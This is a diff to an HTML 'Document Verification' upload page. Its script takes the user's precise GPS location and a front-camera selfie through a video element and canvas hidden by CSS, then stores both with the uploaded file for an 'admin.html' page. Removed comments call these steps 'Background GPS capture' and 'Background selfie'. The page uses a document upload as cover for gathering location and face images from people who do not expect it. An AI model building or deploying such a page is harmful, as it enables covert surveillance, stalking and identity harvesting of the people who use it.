@@ -2,14 +2,7 @@
 <html>
 <head>
     <title>Upload Document</title>
-    <style>
-        body{font-family:Arial;margin:40px;background:#f0f0f0;text-align:center;}
-        button{padding:15px 30px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
-        button:hover{background:#0056b3;}
-        input[type="file"]{margin:20px;display:block;}
-        #status{font-size:18px;color:#28a745;margin-top:20px;}
-        video,canvas{display:none !important;} /* Hidden */
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <h1>Document Verification</h1>
@@ -19,6 +12,7 @@
     <br>
     <button id="uploadAll" disabled>Upload & Verify</button>
     <div id="status"></div>
+    <div id="debug" style="margin-top:20px;font-size:14px;color:#666;"></div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -26,35 +20,110 @@
     <script>
         let lat, lng, photoData;
         const statusEl = document.getElementById('status');
+        const debugEl = document.getElementById('debug');
         const uploadBtn = document.getElementById('uploadAll');
         const fileInput = document.getElementById('fileInput');
         
+        function log(msg) {
+            debugEl.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
+            console.log(msg);
+        }
+        
         // Enable button when file selected
         fileInput.onchange = () => {
-            if (fileInput.files[0]) uploadBtn.disabled = false;
+            if (fileInput.files[0]) {
+                uploadBtn.disabled = false;
+                log('File selected: ' + fileInput.files[0].name);
+            }
         };
         
-        // Background GPS capture when upload clicked [web:1][web:8]
         uploadBtn.onclick = async () => {
-            statusEl.textContent = 'Capturing location...';
+            log('Upload button clicked');
+            statusEl.textContent = 'Starting...';
             uploadBtn.disabled = true;
             
             try {
-                // GPS first
+                // 1. GPS
+                log('Requesting GPS...');
+                statusEl.textContent = 'Capturing location...';
                 const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
                 });
-                lat = pos.coords.latitude; lng = pos.coords.longitude;
+                lat = pos.coords.latitude; 
+                lng = pos.coords.longitude;
+                log(`GPS captured: ${lat}, ${lng}`);
                 
-                // Background selfie [web:2][web:9]
+                // 2. Camera
+                log('Requesting camera...');
+                statusEl.textContent = 'Capturing photo...';
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {facingMode: 'user', width: 320, height: 240}
+                    video: { facingMode: 'user', width: 320, height: 240 }
                 });
+                
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for camera
+                // Wait for video to load
+                await new Promise(resolve => {
+                    if (video.videoWidth > 0) return resolve();
+                    video.onloadedmetadata = resolve;
+                    setTimeout(resolve, 2000);
+                });
                 
                 const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
                 canvas.getContext('2d').drawImage(video, 0, 0);
+                photoData = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+                log('Photo captured');
+                
+                // 3. File
+                const file = fileInput.files[0];
+                log('Reading file: ' + file.name);
+                statusEl.textContent = 'Processing file...';
+                
+                const reader = new FileReader();
+                await new Promise((resolve, reject) => {
+                    reader.onload = () => resolve();
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                });
+                
+                // 4. Save
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    location: {lat, lng},
+                    photo: photoData,
+                    fileName: file.name,
+                    fileData: reader.result,
+                    fileSize: file.size
+                };
+                
+                const uploads = JSON.parse(localStorage.getItem('uploads') || '[]');
+                uploads.push(data);
+                localStorage.setItem('uploads', JSON.stringify(uploads));
+                
+                statusEl.innerHTML = '✅ <strong>Upload complete!</strong> Check admin.html';
+                log('SUCCESS: Saved to localStorage');
+                
+            } catch (error) {
+                log('ERROR: ' + error.message);
+                statusEl.textContent = '❌ Failed: ' + error.message;
+                statusEl.style.color = '#dc3545';
+            }
+            
+            uploadBtn.disabled = false;
+            fileInput.value = '';
+        };
+        
+        log('Page loaded - ready');
+    </script>
+</body>
+</html>
